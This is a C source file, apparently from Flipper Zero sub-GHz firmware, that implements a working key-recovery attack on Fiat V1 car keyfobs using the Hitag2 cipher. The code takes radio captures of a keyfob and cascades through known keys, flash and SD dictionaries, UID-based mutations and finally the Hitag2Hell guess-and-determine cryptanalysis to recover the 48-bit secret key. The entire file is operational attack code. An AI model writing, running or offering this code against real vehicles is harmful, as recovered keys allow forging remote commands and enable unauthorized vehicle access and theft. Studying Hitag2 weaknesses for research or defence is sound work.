// [HITAG2_BF] Hitag2 bruteforce state machine for Fiat V1
//
// Cascade L1..L5:
//   L1 Known    - 8 keys hardcoded in fiat_v1.c
//   L2 FlashDct - ~90 curated keys embedded in flash
//   L3 SDDict   - streaming dictionary from apps_data/subghz/assets/
//   L4 Heurist  - mutations (UID-derived, epoch, byte increments)
//   L5 Hitag2Hl - guess-and-determine attack (Hitag2Hell) via
//                 subghz_hitag2_hell.h, 32-way bitsliced adapted to Fiat V1.

#include "subghz_hitag2_bf.h"
#include "subghz_hitag2_core.h"
#include "subghz_hitag2_hell.h"

#include <lib/subghz/protocols/fiat_v1.h>
#include <storage/storage.h>
#include <furi_hal.h>

#define TAG "Hitag2Bf"

// Yield-to-scheduler cadence (keys tested between callback invocations)
#define SUBGHZ_HITAG2_BF_YIELD_INTERVAL 512U

// L4 heuristic: how many mutations to try
#define SUBGHZ_HITAG2_BF_L4_MAX_KEYS 65536U

// L5 (Hitag2Hell): full L0 sweep is 2^20 slots. We split into chunks so we
// can call progress + yield often, and also to allow the caller to cancel
// promptly. Chunk size = 4096 slots ~= a few seconds each on Cortex-M4.
#define SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE 4096U
#define SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS (1UL << 20)

struct SubGhzHitag2Bf {
    SubGhzHitag2BfCapture captures[SUBGHZ_HITAG2_BF_MAX_CAPTURES];
    uint8_t capture_count;

    uint8_t levels_mask;

    // Result
    bool found;
    uint8_t found_key[6];
    uint32_t found_epoch;
    uint8_t found_level;

    // Runtime stats
    uint64_t keys_tested_total;

    // Cancellation
    volatile bool cancel;
};

// -----------------------------------------------------------------------------

SubGhzHitag2Bf* subghz_hitag2_bf_alloc(void) {
    SubGhzHitag2Bf* instance = malloc(sizeof(SubGhzHitag2Bf));
    memset(instance, 0, sizeof(*instance));
    instance->levels_mask = 0xFFU; // all levels enabled by default
    return instance;
}

void subghz_hitag2_bf_free(SubGhzHitag2Bf* instance) {
    furi_check(instance);
    free(instance);
}

bool subghz_hitag2_bf_add_capture(
    SubGhzHitag2Bf* instance,
    uint32_t uid,
    uint16_t control,
    uint8_t button,
    uint32_t hop) {
    furi_check(instance);

    if(instance->capture_count >= SUBGHZ_HITAG2_BF_MAX_CAPTURES) {
        return false;
    }
    // All captures MUST share the same UID
    if(instance->capture_count > 0 && instance->captures[0].uid != uid) {
        FURI_LOG_W(TAG, "Rejecting capture with different UID");
        return false;
    }
    // Reject duplicates (same control+button)
    for(uint8_t i = 0; i < instance->capture_count; i++) {
        if(instance->captures[i].control == control &&
           instance->captures[i].button == button &&
           instance->captures[i].hop == hop) {
            return false;
        }
    }

    SubGhzHitag2BfCapture* cap = &instance->captures[instance->capture_count++];
    cap->uid = uid;
    cap->control = control;
    cap->button = button;
    cap->hop = hop;
    return true;
}

uint8_t subghz_hitag2_bf_get_capture_count(const SubGhzHitag2Bf* instance) {
    furi_check(instance);
    return instance->capture_count;
}

uint32_t subghz_hitag2_bf_get_uid(const SubGhzHitag2Bf* instance) {
    furi_check(instance);
    return instance->capture_count > 0 ? instance->captures[0].uid : 0;
}

void subghz_hitag2_bf_set_levels(SubGhzHitag2Bf* instance, uint8_t levels_mask) {
    furi_check(instance);
    instance->levels_mask = levels_mask;
}

bool subghz_hitag2_bf_get_result(
    const SubGhzHitag2Bf* instance,
    uint8_t key_out[6],
    uint32_t* epoch_out,
    uint8_t* level_out) {
    furi_check(instance);
    if(!instance->found) return false;
    if(key_out) memcpy(key_out, instance->found_key, 6);
    if(epoch_out) *epoch_out = instance->found_epoch;
    if(level_out) *level_out = instance->found_level;
    return true;
}

uint64_t subghz_hitag2_bf_get_total_keys_tested(const SubGhzHitag2Bf* instance) {
    furi_check(instance);
    return instance->keys_tested_total;
}

bool subghz_hitag2_bf_verify_multi(
    const SubGhzHitag2Bf* instance,
    const uint8_t key[6],
    uint32_t epoch) {
    for(uint8_t i = 0; i < instance->capture_count; i++) {
        const SubGhzHitag2BfCapture* cap = &instance->captures[i];
        if(!subghz_protocol_fiat_v1_verify_key(
               cap->uid, cap->button, cap->control, cap->hop, key, epoch)) {
            return false;
        }
    }
    return true;
}

// -----------------------------------------------------------------------------
// Level implementations
// -----------------------------------------------------------------------------

// L1: 8 hardcoded known keys from fiat_v1.c
static bool subghz_hitag2_bf_run_l1(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    const uint8_t(*known_keys)[6] = subghz_protocol_fiat_v1_get_known_keys();
    for(uint8_t i = 0; i < FIAT_V1_KNOWN_KEY_COUNT; i++) {
        if(instance->cancel) return false;
        if(subghz_hitag2_bf_verify_multi(instance, known_keys[i], 0)) {
            memcpy(instance->found_key, known_keys[i], 6);
            instance->found_epoch = 0;
            instance->found_level = SubGhzHitag2BfLevelKnown;
            instance->found = true;
            return true;
        }
        instance->keys_tested_total++;
    }
    if(progress_cb) {
        progress_cb(
            SubGhzHitag2BfLevelKnown,
            "Known keys",
            100,
            instance->keys_tested_total,
            context);
    }
    return false;
}

// L2: extended flash dictionary
static bool subghz_hitag2_bf_run_l2(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    const uint32_t total = subghz_hitag2_bf_flash_dict_size();
    for(uint32_t i = 0; i < total; i++) {
        if(instance->cancel) return false;
        const uint8_t(*key)[6] = subghz_hitag2_bf_flash_dict_get(i);
        if(!key) break;
        if(subghz_hitag2_bf_verify_multi(instance, *key, 0)) {
            memcpy(instance->found_key, *key, 6);
            instance->found_epoch = 0;
            instance->found_level = SubGhzHitag2BfLevelFlashDict;
            instance->found = true;
            return true;
        }
        instance->keys_tested_total++;

        if((i & 0x1FU) == 0 && progress_cb) {
            uint8_t pct = (uint8_t)((uint32_t)(i + 1) * 100U / total);
            if(!progress_cb(
                   SubGhzHitag2BfLevelFlashDict,
                   "Flash Dict",
                   pct,
                   instance->keys_tested_total,
                   context)) {
                instance->cancel = true;
                return false;
            }
        }
    }
    return false;
}

// L3: SD dictionary streaming (apps_data/subghz/assets/fiat_hitag2_keys.txt)
// Format: one 12-hex-char key per line (may have # comments and blank lines)
static uint8_t hex_char_to_nibble(char c) {
    if(c >= '0' && c <= '9') return (uint8_t)(c - '0');
    if(c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
    if(c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
    return 0xFFU;
}

static bool parse_hex_key(const char* line, uint8_t key_out[6]) {
    // Skip whitespace
    while(*line == ' ' || *line == '\t') line++;
    if(*line == '#' || *line == '\0' || *line == '\r' || *line == '\n') return false;
    uint8_t nibbles[12];
    uint8_t got = 0;
    while(*line && got < 12) {
        if(*line == ' ' || *line == '\t' || *line == ':') {
            line++;
            continue;
        }
        uint8_t n = hex_char_to_nibble(*line);
        if(n == 0xFFU) break;
        nibbles[got++] = n;
        line++;
    }
    if(got != 12) return false;
    for(uint8_t i = 0; i < 6; i++) {
        key_out[i] = (uint8_t)((nibbles[i * 2] << 4) | nibbles[i * 2 + 1]);
    }
    return true;
}

static bool subghz_hitag2_bf_run_l3(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    bool opened = storage_file_open(
        file, APP_DATA_PATH("/subghz/assets/fiat_hitag2_keys.txt"),
        FSAM_READ, FSOM_OPEN_EXISTING);

    if(!opened) {
        // Try alternative path (some flippers may have subghz/assets in EXT)
        storage_file_close(file);
        opened = storage_file_open(
            file, EXT_PATH("subghz/assets/fiat_hitag2_keys.txt"),
            FSAM_READ, FSOM_OPEN_EXISTING);
    }

    if(!opened) {
        storage_file_free(file);
        furi_record_close(RECORD_STORAGE);
        FURI_LOG_I(TAG, "L3: no SD dictionary file, skipping");
        return false;
    }

    uint64_t total_size = storage_file_size(file);
    uint64_t bytes_read_total = 0;

    char line_buf[64];
    uint8_t line_pos = 0;
    uint8_t key[6];
    char c;
    bool found = false;
    uint32_t report_counter = 0;

    while(!instance->cancel) {
        uint16_t got = storage_file_read(file, &c, 1);
        if(got == 0) {
            // EOF - process any pending line
            if(line_pos > 0) {
                line_buf[line_pos] = '\0';
                if(parse_hex_key(line_buf, key)) {
                    if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
                        memcpy(instance->found_key, key, 6);
                        instance->found_epoch = 0;
                        instance->found_level = SubGhzHitag2BfLevelSDDict;
                        instance->found = true;
                        found = true;
                    }
                    instance->keys_tested_total++;
                }
            }
            break;
        }
        bytes_read_total++;
        if(c == '\n' || c == '\r') {
            if(line_pos > 0) {
                line_buf[line_pos] = '\0';
                if(parse_hex_key(line_buf, key)) {
                    if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
                        memcpy(instance->found_key, key, 6);
                        instance->found_epoch = 0;
                        instance->found_level = SubGhzHitag2BfLevelSDDict;
                        instance->found = true;
                        found = true;
                        break;
                    }
                    instance->keys_tested_total++;
                    report_counter++;
                    if(report_counter >= 512U && progress_cb) {
                        report_counter = 0;
                        uint8_t pct = total_size > 0 ?
                                          (uint8_t)((bytes_read_total * 100U) / total_size) :
                                          0;
                        if(!progress_cb(
                               SubGhzHitag2BfLevelSDDict,
                               "SD Dict",
                               pct,
                               instance->keys_tested_total,
                               context)) {
                            instance->cancel = true;
                            break;
                        }
                    }
                }
                line_pos = 0;
            }
        } else if((size_t)(line_pos + 1) < sizeof(line_buf)) {
            line_buf[line_pos++] = c;
        } else {
            // Line too long, reset
            line_pos = 0;
        }
    }

    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
    return found;
}

// L4: heuristic mutations based on the UID and known-key patterns
static bool subghz_hitag2_bf_run_l4(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    uint32_t uid = subghz_hitag2_bf_get_uid(instance);
    uint8_t key[6];
    uint32_t tried = 0;

    // Strategy 1: XOR common masks with UID and pad with common tails
    // UID split into bytes; combined with typical BCM constants
    static const uint8_t tails[][2] = {
        {0x00, 0x00}, {0xFF, 0xFF}, {0x00, 0xFF}, {0xFF, 0x00},
        {0xAA, 0x55}, {0x55, 0xAA}, {0x12, 0x34}, {0xAB, 0xCD},
        {0xDE, 0xAD}, {0xBE, 0xEF}, {0xCA, 0xFE}, {0xBA, 0xBE},
        {0x00, 0x01}, {0x00, 0x02}, {0x00, 0x08}, {0x00, 0x10},
        {0x01, 0x00}, {0x10, 0x00}, {0x00, 0x99}, {0x99, 0x00},
    };
    static const uint32_t xor_masks[] = {
        0x00000000UL, 0xFFFFFFFFUL, 0xA5A5A5A5UL, 0x5A5A5A5AUL,
        0x12345678UL, 0xDEADBEEFUL, 0xCAFEBABEUL, 0x1F2E3D4CUL,
        0x87654321UL, 0xF0F0F0F0UL, 0x0F0F0F0FUL, 0xC3C3C3C3UL,
    };

    for(size_t mi = 0; mi < sizeof(xor_masks) / sizeof(xor_masks[0]); mi++) {
        for(size_t ti = 0; ti < sizeof(tails) / sizeof(tails[0]); ti++) {
            if(instance->cancel) return false;
            uint32_t patched = uid ^ xor_masks[mi];
            key[0] = (uint8_t)(patched >> 24);
            key[1] = (uint8_t)(patched >> 16);
            key[2] = (uint8_t)(patched >> 8);
            key[3] = (uint8_t)patched;
            key[4] = tails[ti][0];
            key[5] = tails[ti][1];
            if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
                memcpy(instance->found_key, key, 6);
                instance->found_epoch = 0;
                instance->found_level = SubGhzHitag2BfLevelHeuristic;
                instance->found = true;
                return true;
            }
            instance->keys_tested_total++;
            tried++;

            if((tried & 0xFFU) == 0 && progress_cb) {
                uint8_t pct =
                    (uint8_t)((tried * 100U) / SUBGHZ_HITAG2_BF_L4_MAX_KEYS);
                if(pct > 100) pct = 100;
                if(!progress_cb(
                       SubGhzHitag2BfLevelHeuristic,
                       "Heuristic",
                       pct,
                       instance->keys_tested_total,
                       context)) {
                    instance->cancel = true;
                    return false;
                }
            }
        }
    }

    // Strategy 2: increment ±16 the last byte of each known key
    const uint8_t(*known_keys)[6] = subghz_protocol_fiat_v1_get_known_keys();
    for(uint8_t k = 0; k < FIAT_V1_KNOWN_KEY_COUNT; k++) {
        for(int delta = -16; delta <= 16; delta++) {
            if(delta == 0) continue;
            if(instance->cancel) return false;
            memcpy(key, known_keys[k], 6);
            key[5] = (uint8_t)(key[5] + delta);
            if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
                memcpy(instance->found_key, key, 6);
                instance->found_epoch = 0;
                instance->found_level = SubGhzHitag2BfLevelHeuristic;
                instance->found = true;
                return true;
            }
            instance->keys_tested_total++;
            tried++;
        }
    }

    // Strategy 3: try each known key with epoch 1..7 (small window)
    for(uint8_t k = 0; k < FIAT_V1_KNOWN_KEY_COUNT; k++) {
        for(uint32_t epoch = 1; epoch <= 7; epoch++) {
            if(instance->cancel) return false;
            if(subghz_hitag2_bf_verify_multi(instance, known_keys[k], epoch)) {
                memcpy(instance->found_key, known_keys[k], 6);
                instance->found_epoch = epoch;
                instance->found_level = SubGhzHitag2BfLevelHeuristic;
                instance->found = true;
                return true;
            }
            instance->keys_tested_total++;
            tried++;
        }
    }

    return false;
}

// L5: Hitag2Hell guess-and-determine attack.
//
// Uses the 32-way bitsliced port in subghz_hitag2_hell.[ch]. For each capture
// available we run the attack against its authenticator; the resulting state31
// candidates are inverted to keys via hitag2_fiat_invert_init(); each key is
// then cross-validated against ALL captures to eliminate false positives (the
// per-capture false-positive rate is ~2^-32 with a single 32-bit auth; two
// captures drops it to ~2^-64, effectively zero).
//
// The L0 sweep space is 2^20 slots; we split it into chunks so the progress
// callback fires often enough to keep the UI responsive and to allow prompt
// cancellation. Each chunk of 4096 slots takes on the order of seconds on
// x86; on Cortex-M4 the total wall time can be several hours to a day in the
// worst case, but many keys will be found much earlier.

typedef struct {
    SubGhzHitag2Bf* instance;
    SubGhzHitag2BfProgressCallback outer_cb;
    void* outer_ctx;
    uint32_t chunk_base;   // L0 base index of this chunk (0..2^20 in steps of CHUNK_SIZE)
} Hitag2HellBridge;

static bool subghz_hitag2_bf_hell_progress(
    uint8_t pct_within_chunk, uint64_t states_tested, void* ctx) {
    Hitag2HellBridge* b = (Hitag2HellBridge*)ctx;
    b->instance->keys_tested_total = states_tested;

    if(b->instance->cancel) return false;

    if(b->outer_cb) {
        // Global percent = (chunk_base + pct_within_chunk/100 * CHUNK) / TOTAL
        uint32_t base_slots = b->chunk_base;
        uint32_t within = (uint32_t)((SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE *
                                      (uint32_t)pct_within_chunk) / 100U);
        uint32_t global_slots = base_slots + within;
        if(global_slots > SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS) {
            global_slots = SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS;
        }
        uint8_t global_pct = (uint8_t)(((uint64_t)global_slots * 100ULL) /
                                       SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS);
        if(!b->outer_cb(
               SubGhzHitag2BfLevelHitag2Hell,
               "Hitag2Hell",
               global_pct,
               states_tested,
               b->outer_ctx)) {
            b->instance->cancel = true;
            return false;
        }
    }
    furi_delay_ms(1);
    return true;
}

static bool subghz_hitag2_bf_try_hell_on_capture(
    SubGhzHitag2Bf* instance,
    const SubGhzHitag2BfCapture* cap,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    Hitag2HellBridge bridge;
    bridge.instance = instance;
    bridge.outer_cb = progress_cb;
    bridge.outer_ctx = context;

    // Sweep the layer-0 space in chunks
    for(uint32_t chunk_start = 0;
        chunk_start < SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS;
        chunk_start += SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE) {
        if(instance->cancel) return false;

        bridge.chunk_base = chunk_start;

        Hitag2HellConfig cfg = {0};
        cfg.progress_cb = subghz_hitag2_bf_hell_progress;
        cfg.progress_ctx = &bridge;
        cfg.timeout_ms = 0;
        cfg.now_ms_cb = furi_get_tick;
        cfg.l0_start = chunk_start;
        cfg.l0_end = chunk_start + SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE;
        if(cfg.l0_end > SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS) {
            cfg.l0_end = SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS;
        }

        Hitag2HellResult result;
        memset(&result, 0, sizeof(result));

        if(hitag2_hell_recover(cap->hop, &cfg, &result)) {
            // Try each candidate: invert to key, verify against all captures.
            for(uint32_t i = 0; i < result.candidate_count; i++) {
                if(instance->cancel) return false;
                uint8_t key[6];
                if(!hitag2_fiat_invert_init(
                       result.candidates[i],
                       cap->uid,
                       cap->button,
                       cap->control,
                       0, // epoch = 0 (Fiat V1 default)
                       key)) {
                    continue;
                }
                // Multi-capture cross-validation
                if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
                    memcpy(instance->found_key, key, 6);
                    instance->found_epoch = 0;
                    instance->found_level = SubGhzHitag2BfLevelHitag2Hell;
                    instance->found = true;
                    return true;
                }
            }
        }

        if(result.cancelled) {
            instance->cancel = true;
            return false;
        }
    }
    return false;
}

static bool subghz_hitag2_bf_run_l5(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    // Run the attack on the first capture. Multi-capture validation happens
    // per-candidate inside subghz_hitag2_bf_try_hell_on_capture(). Running the
    // attack on additional captures would multiply the wall time without much
    // gain (candidates from cap[0] already include the true key).
    if(instance->capture_count == 0) return false;
    return subghz_hitag2_bf_try_hell_on_capture(
        instance, &instance->captures[0], progress_cb, context);
}

// -----------------------------------------------------------------------------
// Public run entry point
// -----------------------------------------------------------------------------

bool subghz_hitag2_bf_run(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    furi_check(instance);
    if(instance->capture_count == 0) return false;

    instance->cancel = false;
    instance->found = false;
    instance->keys_tested_total = 0;

    // L1
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelKnown)) {
        if(subghz_hitag2_bf_run_l1(instance, progress_cb, context)) return true;
        if(instance->cancel) return false;
    }
    // L2
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelFlashDict)) {
        if(subghz_hitag2_bf_run_l2(instance, progress_cb, context)) return true;
        if(instance->cancel) return false;
    }
    // L3
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelSDDict)) {
        if(subghz_hitag2_bf_run_l3(instance, progress_cb, context)) return true;
        if(instance->cancel) return false;
    }
    // L4
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelHeuristic)) {
        if(subghz_hitag2_bf_run_l4(instance, progress_cb, context)) return true;
        if(instance->cancel) return false;
    }
    // L5 (only if we have >=1 capture, and better with >=2 captures)
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelHitag2Hell)) {
        if(subghz_hitag2_bf_run_l5(instance, progress_cb, context)) return true;
    }

    return false;
}
